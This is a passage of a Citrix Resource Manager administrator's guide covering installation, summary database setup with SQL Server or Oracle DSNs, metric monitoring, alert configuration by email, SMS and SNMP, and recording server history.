If You Are Upgrading from a Previous Version
If you decide to upgrade servers to MetaFrame Presentation Server over a period of time (rather than simultaneously), ensure that you upgrade the Database Connection Server first, then the main Farm Metric Server, then the backup Farm Metric Server, before upgrading other servers in the server farm. Problems may occur if another server is running a later version of Resource Manager.
Installing or Upgrading Resource Manager
Use the following procedure to install or upgrade Resource Manager. You need to follow this procedure for each server in your server farm. To install Resource Manager on a server 1. Follow the installation instructions in Chapter 4 of the MetaFrame Presentation Server Administrator’s Guide, making sure that you choose to install MetaFrame Presentation Server Enterprise Edition. 2. When the Component Selection setup screen appears, if you want to change the installation location of Resource Manager, browse to the correct location then click OK. 3. At the prompt, click Restart to restart the server. Note You need to install the Presentation Server Console on every server from which you want to administer Resource Manager servers. For instructions on how to install the Console, see “To install the Presentation Server Console on a workstation” on page 27.
20
Resource Manager Administrator’s Guide
Go to Document Center
Uninstalling Resource Manager
Important If you are uninstalling MetaFrame Presentation Server from the Resource Manager Farm Metric Server(s) or Database Connection Server for a summary database, reassign the server before uninstalling. That is, change the Farm Metric Server(s) and/or the Database Connection Servers to other Resource Manager servers before uninstalling or removing from the server farm. If you are using a summary database, Citrix recommends that you update it before removing any servers from the server farm. For details of how to update the database, see the Help. To uninstall Resource Manager from a server 1. Log off any currently connected clients and the Presentation Server Console, and exit all programs running on the server. 2. From the Start menu, select Settings &gt; Control Panel &gt; Add/Remove Programs. 3. Select Citrix MetaFrame Presentation Server for Windows. 4. Select Change. The Setup wizard starts. 5. On the Application Maintenance screen, select Modify, then click Next. 6. On the Component Selection screen, select Resource Manager and select Entire feature will be unavailable. 7. Select Next. The selections you have made are listed for review. 8. Click Finish. Note If you run the uninstaller after manually changing the location of Resource Manager, as described in “Changing the Location of Resource Manager After Installation” on page 30, the uninstaller does not remove the Resource Manager folder, and you must delete it manually.
Go to Document Center
Chapter 2 Installing Resource Manager
21
Setting Up a Summary Database
Before you can start using a summary database, you must do the following: 1. Install your DBMS software on a server and create a database on it. This server is the database storage facility for your server farm’s summary data. It does not need to be a farm server but needs to be available to the server farm through the network. You need to ensure that this server has enough available space to store the summary database. Refer to “Managing the Resource Manager Summary Database” on page 52. Resource Manager supports the following DBMS software: • • Microsoft SQL Server Versions 7 and 2000. Oracle Database Versions 7, 8i, and 9i. If you are using an Oracle DBMS, ensure that the character set it uses contains all the characters you use in your server farm; for example, for server and application names. This includes special characters and currency symbols.
Important When you create your summary database on the DBMS server, the DBMS access credentials you set to be used by Resource Manager must each not exceed 255 characters in length. This is irrespective of the limits of the DBMS software itself. If you are using a Microsoft SQL Server DBMS, do not use the master database for your summary database. The master database is used by SQL Server for internal functions. Using it for your summary database may cause database corruption problems. Citrix recommends that you do not install the DBMS on the Database Connection Server. 2. Set a system data source name (DSN). The system DSN stores information about how a client can connect to a database. It is required by the Database Connection Server (the database client) to be able to communicate with the summary database DBMS. Refer to “Setting a System Data Source Name” on page 22. 3. Configure a Database Connection Server. This server enables communications between the server farm and the summary database by writing data to the database and reading data from it. It should be relatively low-load for best performance. Refer to “Configuring a Database Connection Server” on page 24.
<img src="" alt=""> 22
Resource Manager Administrator’s Guide
Go to Document Center
Setting a System Data Source Name
To set a system data source name for Microsoft SQL Server DBMS 1. Choose a server to be your Database Connection Server. 2. Open the Windows Control Panel. 3. Open the ODBC Data Source Administrator dialog box. To do this, open Administrative Tools, then open Data Sources (ODBC). 4. Click the System DSN tab. 5. Click Add. 6. In the Create New Data Source dialog box, select SQL Server. 7. Click Finish. 8. In the Microsoft SQL Server DSN Configuration dialog box, type rmsummarydatabase in the Name box. Type a description (optional), then select the server with the DBMS installed on it from the Server list. Important You must type rmsummarydatabase exactly. Any spaces or spelling errors will make the database unrecognizable to the Database Connection Server. However, the field is not case-sensitive.
Screenshot of the Microsoft SQL Server DSN Configuration Dialog Box</p>
<ol>
<li>Click Next.
Go to Document Center
Chapter 2 Installing Resource Manager
23</li>
<li>Select how Microsoft SQL Server authenticates your identification so you can set up the system DSN. Either: Click With Windows NT authentication using the network login ID to use Windows NT authentication. —Or— • Click With SQL Server authentication using a login ID and password entered by the user, then select the Connect to SQL Server to obtain default settings for the additional configuration options check box and type a user name and password in the Login ID and Password boxes, respectively. •</li>
<li>Click Client Configuration. 12. In the Edit Network Library Configuration dialog box, select TCP/IP under Network libraries. 13. Click OK. 14. Click Next. 15. Select the Change the default database to check box, then select the database you created on the DBMS server from the list. 16. Click Next, then Finish. 17. In the ODBC Setup dialog box, you can click Test Data Source to confirm the DSN configuration. Click OK, then OK again to close the dialog box. 18. Click OK to close the ODBC Data Source Administrator dialog box. For more information, refer to your Windows operating system and Microsoft SQL Server documentation. To set a system data source name for Oracle DBMS Note The system DSN setup described below may be different for other Oracle versions. 1. Choose a server to be your Database Connection Server. 2. Open the Windows Control Panel. 3. Open the ODBC Data Source Administrator dialog box. To do this, open Administrative Tools, then open Data Sources (ODBC). 4. Click the System DSN tab. 5. Click Add.
24
Resource Manager Administrator’s Guide
Go to Document Center</li>
<li>In the Create New Data Source dialog box, select the Oracle ODBC Driver option. This option is available only after the Oracle Client is installed. 7. Click Finish. 8. In the Oracle ODBC Driver Configuration dialog box, type rmsummarydatabase in the Data Source Name text box. Type a description (optional). Important You must enter rmsummarydatabase exactly. Any spaces or spelling errors will make the database unrecognizable to the Database Connection Server. However, the field is not case-sensitive. 9. From the TNS Service Name list, select the global database name of the Oracle database, and type the user name in the User ID box. 10. Select Disable Microsoft Transaction Server (MTS) in the Workarounds tab. For information about why MTS needs to be disabled, refer to Microsoft Knowledge Base articles Q180190 and Q193893, available from <a href="http://www.microsoft.com" target="_blank">http://www.microsoft.com</a>. 11. Ensure that: • • The Read Only check box is cleared Enable closing cursor and Enable Results Set are selected</li>
<li>Click OK to close the Oracle ODBC Driver Configuration dialog box. Note that the dialog box shown varies between Oracle releases. For more information, refer to your Windows operating system and Oracle Database documentation.
Configuring a Database Connection Server
After you set up a system data source name (DSN) on the Database Connection Server, you need to configure this server as the Database Connection Server using the Presentation Server Console. To configure a Database Connection Server 1. In the left pane of the Console, click Resource Manager. 2. In the right pane, click the Summary Database tab. 3. Click Configure. 4. In the Summary Database Configuration dialog box, select your Database Connection Server from the Server list. Only servers running Resource Manager for MetaFrame Presentation Server appear in the list.
<img src="" alt=""> Go to Document Center
Chapter 2 Installing Resource Manager
25
Note If a server name is dimmed, this means that the server is running an older version of Resource Manager and should not be selected. 5. Enter the DBMS access credentials in the User and Password boxes. These must match valid credentials defined within the supporting DBMS (the Oracle or Microsoft SQL Server database you are using). Note Resource Manager supports Windows NT authentication for the Microsoft SQL Server user name. The 255 character limit for the user name includes the domain name, the intervening backslash ( \ ), and the user name. 6. Click Test to check the connection to the database. You can now activate the summary database. See “Turning the Summary Database On” on page 25. You can further configure the Database Connection Server in the following ways: • • • • Configure the database update time. See “Setting the Summary Database Update Time” on page 48. Configure a database purging schedule to remove unwanted information. See “Removing Unwanted Information from the Database” on page 47. Choose the methods for sending alerts when an update to the database fails. See “Preparing Your System for Resource Manager Alerts” on page 36. Configure data collection restrictions for all farm servers. See “Using FarmWide Options for Reducing Summary Data” on page 46.
Turning the Summary Database On
To begin recording data for your database, you need to turn the summary database on after installation. When it is on, Resource Manager servers create and store information for inclusion in the summary database. To turn the summary database on 1. In the left pane of the Console, click Resource Manager. 2. In the right pane, click the Summary Database tab. Note The first icon in the Status panel is Not Configured when the summary database is off or a Database Connection Server is not configured. In this state, Resource Manager servers are not creating or storing information for inclusion in the summary database.
<img src="" alt=""> <img src="" alt=""> 26
Resource Manager Administrator’s Guide
Go to Document Center</li>
<li>Click Configure. 4. In the Summary Database Configuration dialog box, select the Summary Database enabled check box. 5. Click OK, then OK again. The first icon in the Status panel is OK , meaning the summary database is on and a Database Connection Server is correctly configured and in use. In this state, Resource Manager servers are collecting information for inclusion in the database.
Turning the Summary Database Off
If you need to stop creating summary data, for example for maintenance purposes, you can turn the summary database off. CAUTION When the summary database is off, Resource Manager servers will no longer create and store information for the summary database. This may result in data loss until the summary database is turned back on. You cannot turn the summary database off for individual servers; however, you can minimize the data being contributed by choosing to ignore periods of low activity for an individual server, for example, weekends or late at night. Refer to “Ignoring Server Metrics During Periods of Low Server Activity” on page 47 for details. To turn the summary database off 1. In the left pane of the Presentation Server Console, click Resource Manager. 2. In the right pane, click the Summary Database tab. 3. Click Configure. 4. In the Summary Database Configuration dialog box, clear the Summary Database enabled check box. 5. Click OK, then OK again. The first status icon in the Status panel is Not Configured , meaning the summary database is off. In this state, Resource Manager servers are not creating or storing information for inclusion in the summary database.
Go to Document Center
Chapter 2 Installing Resource Manager
27
Displaying Resource Manager and its Components
The following procedures are designed to familiarize you with the interface so that you can quickly get up to speed with Resource Manager. The user interface for Resource Manager is integrated with the Presentation Server Console. To open the Presentation Server Console From the Start menu, choose Programs &gt; Citrix &gt; MetaFrame Presentation Server &gt; Presentation Server Console. You can also open the Presentation Server Console from the Access Suite Console if the Access Suite Console has been appropriately configured. When the Console starts, log on to a server. When you are connected to a server farm, the Console displays a window with two main panes: • • The left pane shows a hierarchical list of the components of the server farm The right pane shows information about the object that is selected in the left pane
From this window you can access Resource Manager. The servers and applications that you see depend on whether you are a full administrator or a custom administrator. If you are a full administrator you have access to the entire server farm. If you are a custom administrator you can view and update only those folders of servers or applications for which the full administrator has granted you permissions. You need to install the Console on every machine from which you want to administer servers with Resource Manager installed. You can install the Console on a MetaFrame Presentation Server computer (at the time when you install MetaFrame Presentation Server itself), or on a remote machine. To install the Presentation Server Console on a workstation 1. Ensure that Resource Manager is installed on the server for which you want to view Resource Manager information. 2. Install or upgrade the Presentation Server Console on the workstation using the setup program on the MetaFrame Presentation Server CD-ROM.
<img src="" alt=""> 28
Resource Manager Administrator’s Guide
Go to Document Center
Displaying the Main Resource Manager Screen
To display the main screen In the Presentation Server Console, either: • • In the left pane, click Resource Manager. —Or— In the right pane, double-click Resource Manager.
Screenshot of the Main Resource Manager Screen
This window displays a number of tabs that enable you to perform the following functions in Resource Manager: • • Watcher. Show a real-time list of all servers in the server farm that have an alarm state. Reports. Generate reports about: • • • • • • Current process and user activity, and recent server status. Past process, user, and server activity. These reports require a summary database to be in use.
Summary Database. Configure a summary database and see its status. Billing. Configure cost centers (fees and user groups). If you are using a summary database, generate Billing reports based on resource usage. SMS, SNMP, and E-mail. Configure automatic SMS, SNMP, or email alerts. Farm Metric Server. See the status of Farm Metric Servers and change the servers being used as Farm Metric Servers.
Go to Document Center
Chapter 2 Installing Resource Manager
29
Displaying Resource Manager for the Entire Server Farm
This view enables you to monitor all the servers in your server farm. You can gain an overall picture of the status of the server farm and spot problems as they occur. To display Resource Manager for the entire server farm 1. In the left pane of the Console, click Servers. 2. In the right pane, click the Resource Manager tab.
Displaying Resource Manager for a Single Server
To display Resource Manager for a single server 1. In the left pane of the Console, navigate to the required server. 2. In the right pane, click the Resource Manager tab. This displays all the metrics that are being monitored for that server. If a problem arises, a status icon appears to warn you.
Displaying the Applications in a Server Farm
To see which applications are available for monitoring in a server farm In the left pane of the Console, expand the Applications folder. You can use Resource Manager to monitor all published applications that are running on Resource Manager servers in the server farm. When you start using Resource Manager, all existing published applications are listed in the Applications folder. You can also monitor applications that are not published by setting them up as Resource Manager applications, and identifying the servers on which you want to monitor them. For details of how to set up Resource Manager applications, see the Help. When you set up a Resource Manager application, it is added to the list in the Applications folder. Refer to “Monitoring Your Farm” on page 35.
30
Resource Manager Administrator’s Guide
Go to Document Center
Changing the Location of Resource Manager After Installation
If necessary, you can change the location of Resource Manager after installation. Before changing the location of the Resource Manager files, you must ensure that you set the correct permissions so that the Independent Management Architecture (IMA) service can read and write files at the new location. CAUTION This procedure requires you to edit the registry. Using Registry Editor incorrectly can cause serious problems that may require you to reinstall your operating system. Citrix cannot guarantee that problems resulting from the incorrect use of Registry Editor can be solved. Use Registry Editor at your own risk. To change the location of Resource Manager 1. Stop the IMA service. See the Help for more information on how to do this. 2. Move the Resource Manager folder and all its contents to the new location. 3. Edit the registry key InstallDir in HKEY_LOCAL_MACHINE\SOFTWARE\Citrix\Citrix Resource Manager 4. Restart the IMA service. Note If you run the uninstaller after manually changing the location of Resource Manager, as described here, the uninstaller does not remove the Resource Manager folder, and you must delete it manually.
Go to Document Center
CHAPTER 3
Monitoring Servers and Applications in Real Time
Overview
Resource Manager provides you with information about a number of system and network processes and events. Status displays show this information in real time, enabling you to see the state of your system at a glance. You can monitor the following: • • The status of the servers in a server farm The number of instances of specific applications that are running in a server farm
Each item that is being monitored is referred to as a metric. A metric is a combination of: • • • The type of object that you want to monitor: a physical or logical system resource, for example a computer&#39;s hard disk. The counter to be monitored: the specific aspect of the object that you want to monitor, for example disk free space. The instance of the object: an individual example of the object or a state it needs to reach in order to be counted. For example, a computer may have more than one hard disk. In this case, the instance identifies which disk you want to examine.
When you install Resource Manager, a default set of metrics is configured automatically for each server. You can change the metrics to suit your specific environment. A set of default limits is also configured during installation for the metrics that apply to each server. You can change these limits to suit your needs.
32
Resource Manager Administrator’s Guide
Go to Document Center
When a metric’s value exceeds its defined limits, Resource Manager displays a warning or problem status icon for the metric. These are known as alarms.You can also configure Resource Manager to send messages to notify you of warnings and problems. These are known as alerts. Each server with Resource Manager installed has a Microsoft Jet Access database, in which it stores metric values and application information for the last 96 hours. By default, this database is located in: ...\Citrix Resource Manager\LocalDB\RMLocalDatabase. It is accessed when you are creating real-time graphs, displaying Server Snapshot reports, and running reports on that specific server. The IMA service reads and writes to the database periodically. The size of the database is managed automatically. When the IMA service is started on a server, the local Resource Manager database is automatically compacted every day. You can also use the Management Console for MetaFrame Access Suite to display performance metrics for the servers in a farm in a highly visual way, as described in “Extended Real-Time Monitoring Capabilities” on page 13. For further information, see the assistance provided on the Access Suite Console screens.
Configuring Metrics on Servers
When you install Resource Manager, it automatically configures a default set of metrics for each server. These default metrics are described in Appendix A. Resource Manager metrics are derived from Microsoft Windows Performance Monitor; Resource Manager can track any Windows Performance Monitor counter as a server metric. For explanations of the metrics and advice on customizing metrics, refer to Appendix C of the MetaFrame Presentation Server Administrator’s Guide and the Microsoft Windows Help for Performance Monitor. Resource Manager configures default alarm thresholds for the default metrics. Citrix recommends that you customize these metrics over time to suit your environment, and that you limit the total number of metrics being tracked on a server to 50. The default metrics provide a real-time overview of each server but, to performance tune each server, you can add more specific metrics. This set of metrics is, by default, recorded in the summary database if one is configured. For further information on how to configure metrics, see the Help.
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> Go to Document Center
Chapter 3 Monitoring Servers and Applications in Real Time
33
Checking the Status of Server Metrics
For each server in your system, status icons show the status of each monitored condition or metric. During installation, Resource Manager automatically configures a set of limits for the metrics that apply to each server. If a metric’s value falls outside normal limits for a particular length of time (a tolerance time that you can configure), the status icons change. You may need to alter these limits to suit your specific environment. You can set alerts to be triggered when either yellow (warning) or red (problem) status occurs, and also when an alert state changes back to green (OK). See the Help for more information on setting metric limits. You can also set alerts to be sent when the status of a metric returns to green (OK) or yellow, having been previously at yellow or red. The meaning of each status icon is described below:
Represents normal operation; that is, the value of the metric falls between the set limits. Represents a warning condition. This means that a problem may be developing that will require further analysis to improve performance or to prevent the situation from becoming worse. Represents a problem condition. This often means that some action is required to provide better application or server performance. Both yellow and red indicators occur when the value for a metric falls outside the normal limits and remains there for a defined period of time. Represents a metric that is not yet active, and needs to be configured. Not Configured Sleep Represents a metric that is set to “Sleep”; that is, you indefinitely suspended notification of the metric’s status. See “Suspending Notification of a Metric’s Status” on page 36 for details. This icon is also used (for all metrics) if the server is unlicensed. Represents a metric that is set to “Snooze”; that is, you suspended notification of the metric’s status for a fixed period. See “Suspending Notification of a Metric’s Status” on page 36 for details.
OK Warning
Critical
Snooze
Resource Manager determines the status of each metric by sampling the raw performance data every 15 seconds, and updates metric status icons accordingly. The history of metrics being monitored on a server is recorded in the Resource Manager server log. For details of how to view the log, see the Help.
34
Resource Manager Administrator’s Guide
Go to Document Center
Customizing Server Metrics
If you need to change the way in which Resource Manager monitors the servers in real time, you can: • • • Change the list of metrics being monitored for a server Configure the way alerts work for individual metrics Change the list of processes that Resource Manager does not monitor
If you need to configure a new metric, you can display a graph of the current values for that metric using the Visual Threshold Configuration option, and use this to help you set the appropriate thresholds. You can also change the server that deals with farm-wide metrics. In the server farm, the Farm Metric Server interprets metrics that apply to the entire server farm (such as application counts), and sends alerts if necessary.
Monitoring the Disk on a Server with Windows 2000 or Later installed
By default, Resource Manager monitors the LogicalDisk performance object on Windows 2000 Server machines. Some installations of Windows 2000 Server, without Windows 2000 Service Pack 1 installed, do not include the LogicalDisk performance object. If you have this type of installation, no disk monitoring metric is included in the default list of metrics. You can address this in two possible ways: • You can monitor the PhysicalDisk performance object instead, by adding appropriate PhysicalDisk metrics using Resource Manager. This means that only the physical drive is monitored, not each partition, and % Disk Free Space is not monitored. You can install Windows 2000 Service Pack 1, which enables you to monitor the LogicalDisk object. This is preferable, because you can then also monitor the physical drive, partition, and % Disk Free Space.
•
Go to Document Center
Chapter 3 Monitoring Servers and Applications in Real Time
35
Configuring Application Metrics
Resource Manager monitors only one metric for each application. This is the Count metric, which maintains a count of how many instances of specific applications are running in the server farm, and notifies you if the number of instances of a monitored application reaches a defined limit. This enables you to manage application licenses. You can monitor all MetaFrame Presentation Server published applications. You can also monitor applications that have not been explicitly published, for example, because the desktop itself is published, or because you are not deploying the application through MetaFrame Presentation Server. To do this, you need to set up the application as a Resource Manager application. See the Help for more information. Resource Manager can monitor a published application only if you specified the full path name of the application in the Properties dialog box when you published the application in MetaFrame Presentation Server. When you publish an application, it is a good idea to use the Browse button to select the executable, to ensure that you use the correct full path. For full information on publishing applications, refer to the MetaFrame Presentation Server Administrator’s Guide. If an application path name also specifies command-line parameters for the program, surround the path name with double quotes (“ ”). This enables Resource Manager to distinguish between process name and argument list and monitor the published application correctly. Important You can only use Resource Manager to keep track of the usage of 32-bit applications. You cannot monitor 16-bit applications.
Monitoring Your Farm
Resource Manager enables you to monitor the status of servers and applications in your server farm in a number of ways. You can organize servers and applications in the server farm into folders and use Resource Manager to monitor each folder as a unit. You can then see an overview of the servers or applications in the folder, as well as an overview of the entire server farm. See the Help for more information on real-time monitoring. At times when you do not want to show the full status display on the screen, you can monitor servers or server folders by displaying a smaller window, called the Watcher Window.
36
Resource Manager Administrator’s Guide
Go to Document Center
Resource Manager can send alert messages to notify you under the following conditions: • • A server in the server farm unexpectedly stops operating The status of selected metrics changes: • • • • Up to red Up to yellow Down to yellow Down to green
Alerts are sent by email, SNMP message, SMS message, or more than one of these formats. The Farm Metric Server interprets metrics that apply to the entire server farm (for example, application counts) and sends alerts when required for them. Alerts are generated whenever the IMA service stops operating, including expected events such as scheduled reboots.
Suspending Notification of a Metric’s Status
You can stop Resource Manager giving you information about a specific metric. This is useful when, for example, you want to work on a problem without receiving repeated alarms. When you suspend notification, Resource Manager continues recording information about the metric&#39;s values but does not display alarms or send alerts. See the Help for more information.
Preparing Your System for Resource Manager Alerts
You can use Resource Manager to send alert messages when metrics change state. The alerts can be sent using one or more of the following methods: • • • Email messages, using MAPI or SMTP Short Message Service (SMS) text messages to cell/mobile phones Simple Network Management Protocol (SNMP) messages
To use Resource Manager to send alerts, you need to set up one or more Resource Manager servers to send the alert messages. You need to make sure that these servers have additional hardware or software to handle each type of alert you require; for example, a modem for SMS alerts and an email system for MAPI alerts. For SNMP alerts, you need to set up SNMP on every server that has one or more metrics configured to send SNMP alerts.
Go to Document Center
Chapter 3 Monitoring Servers and Applications in Real Time
37
When you have done this, you can configure settings in Resource Manager, such as who will receive the alert messages, and set up the individual server and application metrics that you want to trigger the alert messages. The alert recipients you set up will be used for all the servers in the server farm. You can modify Resource Manager alert recipients for any individual server. If you have delegated responsibility for a set of servers to a custom administrator, you may wish to prevent that administrator from receiving alerts from all the other servers in the farm. You do this by setting up the administrator’s alert contact details in the Add MetaFrame Presentation Server Administrator wizard. For each server folder you can specify whether or not the custom administrator will receive alerts for the servers in that folder. For further details, see the Help provided with the wizard.
Preparing Your System for Email Alerts
Before you can use email alerts, you must configure your system. You can use either MAPI or SMTP to generate email alerts. Select the relevant setting in the Resource Manager Properties dialog box. By default MAPI is used to send alerts. • For MAPI email alerts, you first need to choose and configure the servers in the server farm that you want to use to send the email messages. Then you create a mail profile and enable the Resource Manager MAPI email service. These servers are called MAPI Connection Servers. For SMTP email alerts, you must have an SMTP email server that is accessible from your server farm. You then specify the details of your SMTP server in Resource Manager. See the Help for more information. You can secure communication between your Resource Manager servers and your SMTP server using SSL. For details of how to set up SSL, see “Setting up SSL for SMTP Email Alerts” on page 39.
•
38
Resource Manager Administrator’s Guide
Go to Document Center
Using MAPI to Send Alerts
Selecting the MAPI Connection Servers
You need to select one or more servers in the server farm to be the MAPI Connection Servers. When email alerts are generated in the farm, they are passed to one of the configured MAPI servers, which then sends the actual email. You can configure as many MAPI Connection Servers as you wish. Alerts are sent through a randomly selected MAPI server, although if the server on which an alert is generated is also a MAPI server, that server sends the email. Each MAPI Connection Server must be able to access a mail server (for example, Microsoft Exchange Server). It must have an email client installed (for example, Microsoft Outlook) that conforms to the X-400 protocols.
Creating a Mail Profile for Resource Manager
On each MAPI Connection Server, you need to configure a mail profile for Resource Manager to use. The profile must have the same name and details on all of your MAPI Connection Servers. Citrix recommends that you give the profile a name that is easy to recognize (for example, Resource Manager). The profile is used throughout the server farm. When you create the mail profile, ensure that you include the mail system that you want to use; for example, Microsoft Exchange Server. You can also specify an address book for the profile. When you have set up the profile, it is a good idea to test that you can log on to your email system using the profile and that you can send a message. Note A user who is configured to use the email profile can log on to the email system without being prompted for logon credentials. For more information on configuring email profiles, refer to Citrix Knowledge Base article CTX333658 available at <a href="http://knowledgebase.citrix.com" target="_blank">http://knowledgebase.citrix.com</a>.
Enabling the Resource Manager MAPI Mail Service
Email alerts are managed by a service called Resource Manager Mail. This service is installed automatically on all servers on which you install Resource Manager. You need to enable the service on each MAPI Connection Server. To enable the Resource Manager Mail Service on a MAPI Connection Server 1. Open the Windows Control Panel. 2. Open the Services dialog box. To do this, open Administrative Tools, then open Services.
Go to Document Center
Chapter 3 Monitoring Servers and Applications in Real Time
39</li>
<li>In the Properties dialog box for the Resource Manager Mail service, click the General tab and ensure that the startup type for the service is set to Automatic. 4. Click the Log On tab and select This account. 5. Enter the details of the local user account, including the domain, that you want Resource Manager to use for email alerts. Ensure that you type the account and domain details exactly, or browse to the account so that you can be sure that the details you enter are correct. 6. Ensure that the Resource Manager Mail service is started.
Configuring Resource Manager to Use MAPI Email Alerts
After you set up the MAPI Connection Servers, you must set up Resource Manager to use email alerts for the server farm. For example, you need to specify the alert recipients. These settings apply to the entire server farm. See the Help for more information on MAPI email alerts.
Setting up SSL for SMTP Email Alerts
Important This section assumes that you have access to a certificate authority and an appropriate root certificate, and are familiar with the procedure of adding a certification path to a Windows server. You must also ensure that your SMTP server supports SSL, and is properly configured to use SSL in your network environment. 1. Install the certification path of your certificate authority on each Resource Manager server. In the Microsoft Management Console, add the root certificate path in the following location: Certificates (Local Computer)\Trusted Root Certification Authorities\Certificates. This step enables each server to trust certificates issued from your certificate authority. 2. In the left pane of the Presentation Server Console, click Resource Manager. In the right pane, click E-mail. In the E-mail tab: • Specify the SMTP server by typing its fully qualified domain name (FQDN). For example: smtpserver1.mydepartment.mycompany.com. Click Use SSL to send e-mail alerts. Click OK.
• •
40
Resource Manager Administrator’s Guide
Go to Document Center
Preparing Your System for SMS Alerts
To send an SMS message to a cell/mobile phone, a Resource Manager server makes a call through its modem to a number that is designated by the cell/mobile service provider. It then sends data to the service provider&#39;s computer, instructing it to send an SMS message to the cell/mobile phone of the person who is to receive the alert. If you want to use SMS alerts, ensure that at least one Resource Manager server in the server farm has a modem. This can be an analog modem or an ISDN card. You need to investigate the modem requirements of the service providers for the cell/mobile phones to which you want to send alerts. Some service providers require a specific type of modem (usually analog). Where this is the case, at least one server with that type of modem must be in the server farm before you can use SMS alerts for that service provider. If the people that you want to receive SMS alerts use a variety of service providers, you need to know the details of the gateway that Resource Manager must use to communicate with each service provider. Each provider is likely to have a different telephone number, and may employ a different protocol to carry the messages. Some service providers offer an analog line, others offer ISDN. You probably need to configure a range of numbers to call and a range of protocols to use. The alert recipients you set up will be used for all the servers in the server farm. You can modify Resource Manager alert recipients for any individual server.
Configuring Resource Manager to Use SMS
When you are sure that you have fulfilled all the requirements for SMS alerts, you can configure the way in which Resource Manager uses SMS for alerts in the server farm. For example, you need to specify the alert recipients. These settings apply to the entire server farm. You can also specify SMS alert recipients for individual servers.You need to select one or more servers in the server farm to send the SMS alerts. Such a server is called a TAPI Server. For more information on configuring Resource Manager to use SMS, see the Help.
Preparing Your System for SNMP Alerts
Resource Manager can send five different SNMP alerts: • • • trapServerDown - The Resource Manager server is down trapMetrictoGreen - The metric on the Resource Manager server has changed to green status trapMetricGreenToYellow - The metric on the Resource Manager server has changed from green to yellow status
Go to Document Center
Chapter 3 Monitoring Servers and Applications in Real Time
41
• •
trapMetricRedtoYellow - The metric on the Resource Manager server has changed from red to yellow status trapMetricToRed - The metric on the Resource Manager server has changed to red status
To receive SNMP messages, a computer on a network requires an SNMP management tool that enables it to “listen” for messages. A number of third-party commercial tools are available. You need to install and set up the Windows 2000 or Windows Server 2003 SNMP service on every server that has a metric configured to send SNMP alerts. If you want Resource Manager to send alerts for the Count metric on any applications that are running in the server farm, ensure that the Farm Metric Server has the Windows SNMP service enabled and running.
Getting More Information About Metrics and Monitoring
Resource Manager uses server performance and resource metrics derived from the Microsoft Windows Performance Monitor. For explanations of the metrics and advice on customizing metrics, refer to Appendix C of the MetaFrame Presentation Server Administrator’s Guide and the Microsoft Windows Help for Performance Monitor.
Go to Document Center
CHAPTER 4
Recording the History of Servers and Applications
Overview
This chapter explains how you can use Resource Manager to store details of server performance, application instances, and resource usage in a summary database. Topics include: • • • How Resource Manager information gets into a summary database What information you should record in a summary database Scheduling data collection for a summary database
For information on how to set up a summary database, see “Setting Up a Summary Database” on page 21.
How Does Resource Manager Information get into a Summary Database?
Each Resource Manager server creates a summarized version of its daily activity. This information is known as summary data. There are various types of summary data: • • • • Server-specific performance metrics Server-specific session information Farm-wide application metrics Farm-wide server events (for example, server-down)
Farm-wide metric and server event information is generated as summary data by the Farm Metric Server in addition to its own server-specific information and metrics. Farm-wide metrics are routed from servers to the Farm Metric Server through the zone data collector.
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 44
Resource Manager Administrator’s Guide
Go to Document Center
Summary data is kept in special temporary summary files that are stored locally on each server in a database-compatible format. Each hour, Resource Manager adds the summary data gathered over the previous hour to the summary files. Summary files are stored in the \Program Files\Citrix\Citrix Resource Manager\SummaryFiles folder. On a daily basis, the summary data held by each server in the server farm is collected by the Database Connection Server. The Database Connection Server then updates the summary database. After the summary database has been updated, summary files are overwritten with new data. The following diagram represents a typical server farm utilizing the Resource Manager summary database. It shows the flow of both server-specific and farmwide summary data from the farm servers to the summary database through the Database Connection Server.
Server Farm Farm Metric Server
An Application
An application example for the purposes of demonstrating the having a Summary Database.
An Application
An application example for the purposes of demonstrating the having a Summary Database.
Database Connection Server Server
External Database
An Application
An application example for the purposes of demonstrating the having a Summary Database.
Server
Server
Legend
An Application
An application example for the purposes of demonstrating the having a Summary Database.
Farm-wide metrics Server-specific metrics Farm-wide metrics collated on the Farm Metric Server continuously (via zone data collector) Hourly summary data sent to Database Connection Server once per day Daily summary data
A Diagram Showing a Server Farm Using a Summary Database
Go to Document Center
Chapter 4 Recording the History of Servers and Applications
45
What Information Should I Record in the Database?
Resource Manager servers, by default, automatically record process-related and session-related information and server events in the summary database. The scope and detail of this information cannot be changed. A number of default metrics are also included in the database when you install Resource Manager. You can modify the default metric set or specify your own for individual or multiple servers. Note When you make changes to the summary database configuration, it can take up to 10 minutes for other Presentation Server Consoles in the farm to be updated with the new settings.
Issues to Consider when Selecting Database Information
You need to consider some important issues when selecting information to be stored in your database. These are outlined below.
The Benefits of Keeping Long-Term Resource Manager Information
Store information that will be useful; for example, if you are billing users for RAM usage, you can store process information until you create bills for it. It is a waste of summary database space to store information that is of little significance for your server farm. For example, there is little point recording the amount of application usage on a server if you don’t care what specific applications are being used.
Deciding Which Metrics Information to Store
You need to decide what metric information to store for different servers in your server farm. This is important if you have several servers contributing differing metric information to the database because it may confuse an assessment of the server farm as a whole when using summary database reports. Consider the following scenario: An administrator has selected the “LogicalDisk - % Free Space” metric to be recorded in the database for half of the servers in the server farm. At a later date, an administrator generates a report from the summary database to find the servers most in need of hard drive upgrades (least hard disk free space). Because half of the servers in the server farm are not storing this metric in the database, the administrator does not get an accurate report of the overall state of the server farm for the metric.
46
Resource Manager Administrator’s Guide
Go to Document Center
How Can Recording a Metric Affect Database Growth?
You need to consider how quickly your summary database will grow when storing your chosen metric information, and the amount of hard disk space available to the DBMS. The larger your server farm, and the more information you store, the faster your database will grow. For more information about estimating the growth of the database, see “Estimating Summary Database Growth” on page 53. To help you manage database growth, you can remove unwanted data using a purging schedule. Database purging automatically deletes records older than a specified age. See “Removing Unwanted Information from the Database” on page 47 for details.
Selecting Server and Application Metrics to Record in the Database
Whenever you add a new metric, it is automatically set to be summarized. Refer to Chapter 3 for details about how to set and use metrics. You can select server or application metrics for individual servers or applications, or use one setting for multiple servers or applications. See the Help for more information.
Using Farm-Wide Options for Reducing Summary Data
Resource Manager enables you to reduce the amount of farm-wide summary data being generated. You can use the Collection Restrictions option described in the Help to create summary data only for processes connected to, or part of, MetaFrame Presentation Server published applications or Resource Manager applications. Note Collection restrictions may affect resource billing because process data that is not stored in the summary database cannot be billed.
Go to Document Center
Chapter 4 Recording the History of Servers and Applications
47
